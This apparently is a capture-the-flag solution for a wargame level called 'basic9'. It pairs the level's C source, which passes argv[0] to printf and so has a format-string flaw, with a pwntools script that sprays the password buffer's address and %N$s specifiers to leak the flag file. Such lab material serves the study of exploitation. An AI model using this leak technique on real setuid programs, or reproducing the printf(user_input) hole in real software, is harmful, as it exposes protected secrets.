# #include <stdlib.h>
# #include <stdio.h> 
# #include <string.h>

# #define MAX_SIZE    256
# #define PASSFILE    "/home/basic9/flag"

# char password[MAX_SIZE + 1] = {0}; -> 0x804a060

# void get_password(void)
# {
#         FILE *passfile;
#         int c, i = 0;

#         if ((passfile = fopen(PASSFILE, "r")) == NULL)
#         {
#                 printf("Fail...\n");
#         }
#         else
#         {
#                 printf("Reading password to the next level, can you get it ? :p\n");

#                 while ((c = fgetc(passfile)) != EOF && i < MAX_SIZE) {
#                         password[i++] = c;
#                 }
#                 fclose(passfile);
#         }
# }

0xfffbcda5 - 0xfffbc0d0

# int main(int argc, char **argv)
# {
#         get_password();

#         if (argc > 1)
#         {
#                 printf("Bad usage!\n");
#                 printf("You must call this programm without arguments, like this :\n");
#                 printf(argv[0]);
#                 printf("\n");
#         }

#         /* do something useful here :) */

#         return 0;
# }



#!/usr/bin/python3
from pwn import *


# payload with some padding to align the address
# 0x804a060 is the address of password global variable in the binary
payload = p32(0x804a060)*1000 + b"   "
# append some format strings to print the flag
for i in range(500, 1200):
    payload += bytes(f"{i} leak : %{i}$s\n  ", 'utf-8')
# get the flag by using a fake executable and adding extra argvs
p = process(argv=[payload,'arg2'], executable='/home/basic9/basic9')
print(p.clean())
p.close()


